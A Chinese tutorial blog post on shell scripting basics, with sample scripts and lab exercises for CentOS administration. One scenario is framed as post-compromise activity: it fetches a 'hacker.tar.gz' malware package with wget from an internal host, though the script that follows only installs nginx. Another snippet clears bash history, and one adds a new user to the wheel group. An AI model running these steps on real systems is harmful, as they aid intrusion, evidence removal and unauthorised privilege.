{"title":"shell脚本编写","uid":"311e8dc63e7a9fc5e2fe4b450a9ec38f","slug":"shell脚本编写","date":"2025-08-08T02:13:05.000Z","updated":"2025-08-08T06:58:03.390Z","comments":true,"path":"api/articles/shell脚本编写.json","keywords":null,"cover":[],"content":"<h1 id=\"shell脚本编写\"><a href=\"#shell脚本编写\" class=\"headerlink\" title=\"shell脚本编写\"></a>shell脚本编写</h1><h2 id=\"一、核心定义：\"><a href=\"#一、核心定义：\" class=\"headerlink\" title=\"一、核心定义：\"></a>一、核心定义：</h2><h3 id=\"1、什么是-Shell？\"><a href=\"#1、什么是-Shell？\" class=\"headerlink\" title=\"1、什么是 Shell？\"></a>1、什么是 Shell？</h3><ul>\n<li>Shell 是 Linux&#x2F;Unix 操作系统的 <strong>命令行解释器 (Command Interpreter)</strong>。它是用户与操作系统内核 (<code>Kernel</code>) 之间交互的<strong>桥梁</strong>或<strong>接口</strong>。</li>\n<li>你通过键盘输入的文本命令（如 <code>ls</code>, <code>cd</code>, <code>mkdir</code>, <code>grep</code> 等），都是由 Shell 接收、解释，然后传递给内核去执行，最终把结果（文本或图形）返回给你。</li>\n<li>常见的 Shell 有：<code>Bash</code> (Bourne-Again Shell， Linux 最常见默认 Shell)、<code>Zsh</code>、<code>Ksh</code> (Korn Shell)、<code>Csh</code>&#x2F;<code>Tcsh</code>、<code>Sh</code> (Bourne Shell) 等。</li>\n</ul>\n<h3 id=\"2、什么是-Shell-脚本-Shell-Script-？\"><a href=\"#2、什么是-Shell-脚本-Shell-Script-？\" class=\"headerlink\" title=\"2、什么是 Shell 脚本 (Shell Script)？\"></a>2、什么是 Shell 脚本 (Shell Script)？</h3><ul>\n<li>一个 <strong>Shell 脚本</strong> 是一个 <strong>包含一系列 Shell 命令的纯文本文件</strong>。</li>\n<li>你可以把它想象成一个包含多条指令的<strong>菜谱 (Recipe)</strong>、一个<strong>操作清单 (List of Operations)</strong> 或一个<strong>小程序 (Small Program)</strong>。</li>\n<li>当你运行这个脚本文件时，你并不是一条一条地手动输入命令，而是让 Shell 解释器（比如 Bash）自动地、<strong>顺序地读取并执行文件中的所有命令</strong>。</li>\n</ul>\n<h3 id=\"3、批处理与自动化-Batch-Processing-Automation\"><a href=\"#3、批处理与自动化-Batch-Processing-Automation\" class=\"headerlink\" title=\"3、批处理与自动化 (Batch Processing &amp; Automation):\"></a>3、批处理与自动化 (Batch Processing &amp; Automation):</h3><ul>\n<li>这是脚本的核心价值和存在意义。它允许你将原本需要手动、重复在终端执行的一系列命令，预先写好放在一个文件中。</li>\n<li>只需执行这个脚本文件一次，就能<strong>自动完成所有的任务</strong>。节省时间，减少人为错误，提高效率。</li>\n<li><strong>例子：</strong> 每天凌晨自动备份指定目录、压缩日志文件、清理临时文件，然后发邮件通知管理员。</li>\n</ul>\n<h3 id=\"4、解释执行-Interpreted-Execution\"><a href=\"#4、解释执行-Interpreted-Execution\" class=\"headerlink\" title=\"4、解释执行 (Interpreted Execution):\"></a>4、解释执行 (Interpreted Execution):</h3><ul>\n<li>Shell 脚本是 <strong>解释型 (Interpreted)</strong> 的，而非 <strong>编译型 (Compiled)</strong> 的（如 C&#x2F;C++、Go）。</li>\n<li>这意味着脚本文件（纯文本）不需要被编译成二进制机器码才能运行。当你执行脚本时，<strong>Shell 解释器</strong>（比如 <code>/bin/bash</code>）会逐行读取你的脚本文件，<strong>实时地解释并执行其中的每一行命令</strong>。</li>\n<li><strong>优点：</strong> 开发速度快（写文本即可）、易于调试（看到哪行出错）、跨平台（在相同 Shell 环境下）。</li>\n<li><strong>缺点：</strong> 通常比编译型程序执行速度慢（因为有解释开销）。</li>\n</ul>\n<h3 id=\"5、文件组成与结构-Components-Structure\"><a href=\"#5、文件组成与结构-Components-Structure\" class=\"headerlink\" title=\"5、文件组成与结构 (Components &amp; Structure):\"></a>5、文件组成与结构 (Components &amp; Structure):</h3><ul>\n<li><p><strong>Shebang (魔法数字)：</strong> 脚本文件<strong>第一行</strong>通常以 <code>#!</code> 开头，后面跟着解释器程序的<strong>绝对路径</strong>（如 <code>#!/bin/bash</code>）。这行告诉操作系统：当直接运行此脚本时（如 <code>./myscript.sh</code>），<strong>应该使用哪个解释器</strong>来执行脚本内容。没有它，系统可能不知道用哪个 Shell。</p>\n</li>\n<li><p><strong>命令 (Commands)：</strong> 脚本的主要内容是你要执行的命令，和你在终端直接输入的命令一模一样（<code>echo</code>, <code>cp</code>, <code>mv</code>, <code>grep</code>, <code>awk</code>, <code>sed</code>, <code>python</code>, <code>curl</code> 等任何可执行程序）。</p>\n</li>\n<li><p><strong>注释 (Comments)：</strong> 以 <code>#</code> 开头的行是注释，<strong>仅供人类阅读</strong>，解释脚本的功能、思路或关键变量。Shell 解释器会忽略这些行。</p>\n</li>\n<li><p><strong>变量 (Variables)：</strong> 用于存储数据（文本字符串或数字）。例如 <code>filename=“backup.tar.gz”</code> 定义变量，用 <code>$filename</code> 引用变量值。</p>\n</li>\n<li><p><strong>流程控制 (Flow Control):</strong></p>\n<ul>\n<li><strong>条件判断 (<code>if/then/elif/else/fi</code>)：</strong> 根据某个条件（如文件存在、变量值等）决定执行哪段代码。</li>\n<li><strong>循环 (<code>for</code>&#x2F;<code>while</code>&#x2F;<code>until</code>)：</strong> 重复执行一段代码多次（如处理列表中的每个文件，或循环检查某个条件）。</li>\n<li><strong>分支选择 (<code>case</code>&#x2F;<code>esac</code>)：</strong> 根据一个变量的不同取值执行不同的代码块（类似其他语言的 <code>switch/case</code>）。</li>\n</ul>\n</li>\n<li><p><strong>函数 (Functions)：</strong> 将一段常用的代码块封装成一个<strong>可重用</strong>的单元。可以给它命名（如 <code>check_space()</code>），并传递参数给它。提高代码的可读性和复用性。</p>\n</li>\n<li><p><strong>输入&#x2F;输出 (Input&#x2F;Output)：</strong> 脚本可以读取用户输入 (<code>read</code> 命令)，向屏幕打印输出 (<code>echo</code>)，将输出重定向到文件或读取文件内容。</p>\n</li>\n<li><p><strong>处理命令行参数：</strong> 脚本可以接收在运行时通过命令行传递进来的参数（如 <code>./myscript.sh arg1 arg2</code>），通过 <code>$1</code>, <code>$2</code>, <code>$3</code> … 来引用。</p>\n</li>\n<li><p><strong>特殊变量：</strong></p>\n<p> Shell 提供了一些预定义的特殊变量，如：</p>\n<ul>\n<li><code>$0</code>： 脚本名本身</li>\n<li><code>$1</code>, <code>$2</code>, …<code>$9</code>： 第1个到第9个命令行参数</li>\n<li><code>$#</code>： 传递给脚本的命令行参数个数</li>\n<li><code>$?</code>： <strong>上一条命令</strong>的退出状态（<code>0</code> 通常表示成功，非 <code>0</code> 表示失败）</li>\n<li><code>$$</code>： 当前运行脚本的进程 ID (PID)</li>\n<li><code>$USER</code>： 当前运行脚本的用户名</li>\n<li><code>$HOME</code>： 当前用户的家目录</li>\n</ul>\n</li>\n</ul>\n<p>​\t<strong>执行方式 (Execution Methods):</strong></p>\n<ul>\n<li><strong><code>bash scriptname.sh</code> 或 <code>sh scriptname.sh</code>：</strong> 直接指定解释器执行。<strong>不需要</strong>脚本文件有可执行权限 (<code>x</code>)。<code>sh</code> 通常是链接到默认系统 Shell（可能是 <code>bash</code>，也可能是更简单的 Shell）。</li>\n<li><strong><code>./scriptname.sh</code>：</strong> 指定脚本路径执行（当前目录下的脚本，<code>./</code> 表示当前目录）。这种执行方式<strong>必须</strong>给脚本文件添加可执行权限 (<code>chmod +x scriptname.sh</code>)，并且<strong>第一行必须有正确的 Shebang</strong>。</li>\n<li><strong><code>source scriptname.sh</code> 或 <code>. scriptname.sh</code>：</strong> 使用点命令 (<code>source</code> 或 <code>.</code>) 执行。脚本会在<strong>当前 Shell 环境</strong>中执行，而非创建一个新的子 Shell 进程。这意味着脚本中设置的<strong>环境变量或更改的工作目录会影响你当前的终端会话</strong>。常用于加载配置文件（如 <code>.bashrc</code>）。</li>\n</ul>\n<h3 id=\"6、为什么重要-Why-it-Matters\"><a href=\"#6、为什么重要-Why-it-Matters\" class=\"headerlink\" title=\"6、为什么重要 (Why it Matters)?\"></a>6、为什么重要 (Why it Matters)?</h3><ol>\n<li><strong>自动化繁复任务：</strong> 核心优势！解放双手，节省时间，确保一致性。</li>\n<li><strong>系统管理核心工具：</strong> 管理员必备技能，用于配置系统、安装软件、监控资源、备份恢复等。</li>\n<li><strong>构建强大工具链：</strong> Shell 擅长组合系统命令和过滤文本。结合 <code>grep</code>、<code>awk</code>、<code>sed</code>、<code>sort</code>、<code>uniq</code>、<code>find</code> 等工具，可以高效地处理日志、分析数据、进行系统状态检查。其他脚本语言 (Python, Perl) 也常调用 Shell 命令或脚本。</li>\n<li><strong>调度任务 (<code>cron</code>)：</strong> Shell 脚本是 Linux 定时任务守护进程 <code>cron</code> 的首选执行对象。</li>\n<li><strong>跨平台一致性 (以 Shell 为准)：</strong> 脚本可以在所有安装了相同 Shell (如 Bash) 的 Linux&#x2F;Unix 系统上运行，减少环境差异。</li>\n<li><strong>轻量且快速：</strong> 用于执行系统操作、文件处理和调用外部命令时非常高效，启动快。</li>\n</ol>\n<h2 id=\"二、场景模拟\"><a href=\"#二、场景模拟\" class=\"headerlink\" title=\"二、场景模拟\"></a>二、场景模拟</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">删除/tmp/111下的所有文件</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf /tmp/111/*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cd</span> /tmp</span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> 111</span><br><span class=\"line\"><span class=\"built_in\">cd</span> 111</span><br><span class=\"line\">vim 1.sh</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;rm file!&quot;</span></span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf /tmp/111/*</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> +x 1.sh</span><br><span class=\"line\">./1.sh</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">在一个基础配置已经完成的CentOS 8中，下载各种基础工具(vim、firefox)，下载apache服务，验证</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;更新yum&quot;</span></span><br><span class=\"line\">1、yum update -y <span class=\"comment\">#执行很浪费时间，我们先忽略掉</span></span><br><span class=\"line\"></span><br><span class=\"line\">1、安装基础的开发包</span><br><span class=\"line\">2、安装基础工具</span><br><span class=\"line\">3、下载apache服务</span><br><span class=\"line\">4、验证</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装开发工具包!&quot;</span></span><br><span class=\"line\">yum install -y <span class=\"string\">&quot;Development Tools&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;下载基础工具!&quot;</span></span><br><span class=\"line\">yum install -y vim</span><br><span class=\"line\">yum install -y firefox</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;下载httpd!&quot;</span></span><br><span class=\"line\">yum install -y httpd</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;启动并启用服务!&quot;</span></span><br><span class=\"line\">systemctl start httpd</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> httpd</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;正在验证!&quot;</span></span><br><span class=\"line\">firefox http://127.0.0.1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;自动化脚本运行成功!&quot;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">当你拿到内网一台失陷主机权限以后，你写了以下一个脚本，下载恶意软件rpm包并在linux操作系统上运行</span><br><span class=\"line\">wget http://192.168.0.1:8000/hacker.tar.gz</span><br><span class=\"line\">先在自己电脑上安装一遍rpm包，yum去安装这些依赖包</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/bin/bash</span></span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;安装插件&quot;</span></span><br><span class=\"line\">yum install -y zlib-devel pcre* &amp;&gt; /dev/null</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;解压nginx&quot;</span></span><br><span class=\"line\">tar xf nginx-1.6.0.tar.gz</span><br><span class=\"line\"><span class=\"built_in\">cd</span> nginx-1.6.0</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;正在安装nginx&quot;</span></span><br><span class=\"line\">./configure --prefix=/usr/local/nginx &amp;&gt; /dev/null</span><br><span class=\"line\"></span><br><span class=\"line\">make &amp;&gt; /dev/null</span><br><span class=\"line\">make install &amp;&gt; /dev/null</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;启动nginx&quot;</span></span><br><span class=\"line\">/usr/local/nginx/sbin/nginx</span><br><span class=\"line\">firefox 127.0.0.1 &amp;</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查找所有隐藏文件、查找/tmp目录下最近1天修改的文件、查找权限过于宽松的文件</span><br><span class=\"line\"><span class=\"comment\">#!/bin/bash</span></span><br><span class=\"line\">find / -name <span class=\"string\">&quot;.*&quot;</span> -<span class=\"built_in\">type</span> f</span><br><span class=\"line\">find /tmp -<span class=\"built_in\">type</span> f -mtime -1</span><br><span class=\"line\">find / -<span class=\"built_in\">type</span> f -perm 777</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">显示CPU使用率最高的5个进程</span><br><span class=\"line\"><span class=\"comment\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"comment\"># 显示CPU使用率最高的5个进程</span></span><br><span class=\"line\">ps -eo pid,%cpu,<span class=\"built_in\">comm</span> --<span class=\"built_in\">sort</span>=-%cpu | <span class=\"built_in\">head</span> -n 6</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 显示内存使用率最高的5个进程</span></span><br><span class=\"line\">ps -eo pid,%mem,<span class=\"built_in\">comm</span> --<span class=\"built_in\">sort</span>=-%mem | <span class=\"built_in\">head</span> -n 6</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 杀死指定进程（替换PID为实际进程ID）</span></span><br><span class=\"line\"><span class=\"comment\"># kill 1234</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"comment\"># 删除/tmp目录下超过30天的文件</span></span><br><span class=\"line\">find /tmp -<span class=\"built_in\">type</span> f -mtime +30 -<span class=\"built_in\">exec</span> <span class=\"built_in\">rm</span> -f &#123;&#125; \\;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 清空当前用户的命令历史</span></span><br><span class=\"line\"><span class=\"built_in\">rm</span> -rf ~/.bash_history</span><br><span class=\"line\"><span class=\"built_in\">history</span> -c</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"comment\"># 显示当前登录用户</span></span><br><span class=\"line\"><span class=\"built_in\">who</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 显示最近登录的用户</span></span><br><span class=\"line\">last | <span class=\"built_in\">head</span> -n 10</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 显示失败的登录尝试</span></span><br><span class=\"line\">grep <span class=\"string\">&quot;Failed&quot;</span> /var/log/auth.log</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"comment\"># 显示所有网络连接</span></span><br><span class=\"line\">netstat -tulnp</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 显示外部IP连接</span></span><br><span class=\"line\">netstat -an | grep ESTABLISHED | awk <span class=\"string\">&#x27;&#123;print $5&#125;&#x27;</span> | <span class=\"built_in\">cut</span> -d: -f1 | <span class=\"built_in\">sort</span> | <span class=\"built_in\">uniq</span> -c</span><br><span class=\"line\"></span><br><span class=\"line\">192.168.1.100</span><br><span class=\"line\"></span><br><span class=\"line\">useradd m</span><br><span class=\"line\">usermod -aG wheel m</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"三、实验\"><a href=\"#三、实验\" class=\"headerlink\" title=\"三、实验\"></a>三、实验</h2><h3 id=\"1、写一个自动化脚本，让一台新机子，完成关防火墙，关虚拟网卡，换源，selinux的操作-独立完成\"><a href=\"#1、写一个自动化脚本，让一台新机子，完成关防火墙，关虚拟网卡，换源，selinux的操作-独立完成\" class=\"headerlink\" title=\"1、写一个自动化脚本，让一台新机子，完成关防火墙，关虚拟网卡，换源，selinux的操作  独立完成\"></a>1、写一个自动化脚本，让一台新机子，完成关防火墙，关虚拟网卡，换源，selinux的操作  独立完成</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">systemctl stop firewalld.service                 <span class=\"comment\">#关防火墙</span></span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> firewalld.service</span><br><span class=\"line\"></span><br><span class=\"line\">systemctl <span class=\"built_in\">disable</span> libvirtd.service               <span class=\"comment\">#关虚拟网卡</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#换源</span></span><br><span class=\"line\">sed -i -E <span class=\"string\">&#x27;/^mirrorlist=http:\\/\\/mirrorlist\\.centos\\.org\\/\\?release=\\$releasever&amp;arch=\\$basearch&amp;repo=AppStream&amp;infra=\\$infra$/ &#123;s/^/#/; n; s/^#baseurl=http:\\/\\/mirror\\.centos\\.org\\/\\$contentdir\\/\\$releasever\\/AppStream\\/\\$basearch\\/os\\//baseurl=https:\\/\\/mirrors.aliyun.com\\/centos-vault\\/8.5.2111\\/extras\\/\\$basearch\\/os\\//&#125;&#x27;</span> /etc/yum.repos.d/CentOS-AppStream.repo</span><br><span class=\"line\">sed -i -E <span class=\"string\">&#x27;0,/mirrorlist=http:\\/\\/mirrorlist\\.centos\\.org\\/\\?release=\\$releasever&amp;arch=\\$basearch&amp;repo=BaseOS&amp;infra=\\$infra$/ &#123;N; s/#baseurl=http:\\/\\/mirror\\.centos\\.org\\/\\$contentdir\\/\\$releasever\\/BaseOS\\/\\$basearch\\/os\\//baseurl=https:\\/\\/mirrors.aliyun.com\\/centos-vault\\/8.5.2111\\/extras\\/\\$basearch\\/os\\//; s/^(mirrorlist=)/#\\1/&#125;&#x27;</span> /etc/yum.repos.d/CentOS-Base.repo</span><br><span class=\"line\">sed -i -E <span class=\"string\">&#x27;/\\[extras\\]/,/gpgkey=/ s|(mirrorlist=http://mirrorlist\\.centos\\.org/\\?release=\\$releasever&amp;arch=\\$basearch&amp;repo=extras&amp;infra=\\$infra)|#\\1\\nbaseurl=https://mirrors.aliyun.com/centos-vault/8.5.2111/extras/\\$basearch/os/|; /\\[extras\\]/,/gpgkey=/ s|^#baseurl=http://mirror\\.centos\\.org/\\$contentdir/\\$releasever/extras/\\$basearch/os/||&#x27;</span> /etc/yum.repos.d/CentOS-Extras.repo</span><br><span class=\"line\">yum clean all</span><br><span class=\"line\">yum makecache</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#selinux</span></span><br><span class=\"line\">sed -i -E <span class=\"string\">&#x27;s/^(SELINUX=)enforcing$/\\1permissive/&#x27;</span> /etc/selinux/config</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# vim 1.sh                  <span class=\"comment\">#写上脚本</span></span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">chmod</span> +x 1.sh             <span class=\"comment\">#提权</span></span><br><span class=\"line\">[root@wyf 桌面]# ./1.sh                    <span class=\"comment\">#运行</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250808144437327.png\" alt=\"image-20250808144437327\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250808144512471.png\" alt=\"image-20250808144512471\"></p>\n<h3 id=\"2、写一个自动化脚本，自动识别firefox启动的pid，并且关闭firefox（最好一条命令解决）\"><a href=\"#2、写一个自动化脚本，自动识别firefox启动的pid，并且关闭firefox（最好一条命令解决）\" class=\"headerlink\" title=\"2、写一个自动化脚本，自动识别firefox启动的pid，并且关闭firefox（最好一条命令解决）\"></a>2、写一个自动化脚本，自动识别firefox启动的pid，并且关闭firefox（最好一条命令解决）</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">pgrep -f <span class=\"string\">&#x27;firefox|firefox-bin&#x27;</span> | xargs -r <span class=\"built_in\">kill</span> -15</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# vim 1.sh</span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">chmod</span> +x 1.sh</span><br><span class=\"line\">[root@wyf 桌面]# ./1.sh </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250808145333535.png\" alt=\"image-20250808145333535\"></p>\n<h3 id=\"3、写一个自动化脚本，输出网卡名称和ip地址\"><a href=\"#3、写一个自动化脚本，输出网卡名称和ip地址\" class=\"headerlink\" title=\"3、写一个自动化脚本，输出网卡名称和ip地址\"></a>3、写一个自动化脚本，输出网卡名称和ip地址</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh</span></span><br><span class=\"line\">ip -br addr show | awk <span class=\"string\">&#x27;NR!=1 &amp;&amp; !/^lo/ &#123; if ($3 == &quot;&quot;) &#123; printf &quot;%s: 无IP地址\\n&quot;, $1 &#125; else &#123; split($3, ip, &quot;/&quot;); printf &quot;%s: %s\\n&quot;, $1, ip[1] &#125; &#125;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@wyf 桌面]# vim 2.sh</span><br><span class=\"line\">[root@wyf 桌面]# <span class=\"built_in\">chmod</span> +x 2.sh</span><br><span class=\"line\">[root@wyf 桌面]# ./2.sh </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://cdn.jsdelivr.net/gh/Five0ne15/picgo_pic@main/picgo_picture/image-20250808145723302.png\" alt=\"image-20250808145723302\"></p>\n","feature":true,"text":"shell脚本编写一、核心定义：1、什么是 Shell？ Shell 是 Linux/Unix 操作系统的 命令行解释器 (Command Interprete...","permalink":"/post/shell脚本编写","photos":[],"count_time":{"symbolsCount":"7.1k","symbolsTime":"6 mins."},"categories":[],"tags":[{"name":"Linux","slug":"Linux","count":15,"path":"api/tags/Linux.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#shell%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99\"><span class=\"toc-text\">shell脚本编写</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%80%E3%80%81%E6%A0%B8%E5%BF%83%E5%AE%9A%E4%B9%89%EF%BC%9A\"><span class=\"toc-text\">一、核心定义：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF-Shell%EF%BC%9F\"><span class=\"toc-text\">1、什么是 Shell？</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF-Shell-%E8%84%9A%E6%9C%AC-Shell-Script-%EF%BC%9F\"><span class=\"toc-text\">2、什么是 Shell 脚本 (Shell Script)？</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%E3%80%81%E6%89%B9%E5%A4%84%E7%90%86%E4%B8%8E%E8%87%AA%E5%8A%A8%E5%8C%96-Batch-Processing-Automation\"><span class=\"toc-text\">3、批处理与自动化 (Batch Processing &amp; Automation):</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4%E3%80%81%E8%A7%A3%E9%87%8A%E6%89%A7%E8%A1%8C-Interpreted-Execution\"><span class=\"toc-text\">4、解释执行 (Interpreted Execution):</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5%E3%80%81%E6%96%87%E4%BB%B6%E7%BB%84%E6%88%90%E4%B8%8E%E7%BB%93%E6%9E%84-Components-Structure\"><span class=\"toc-text\">5、文件组成与结构 (Components &amp; Structure):</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" 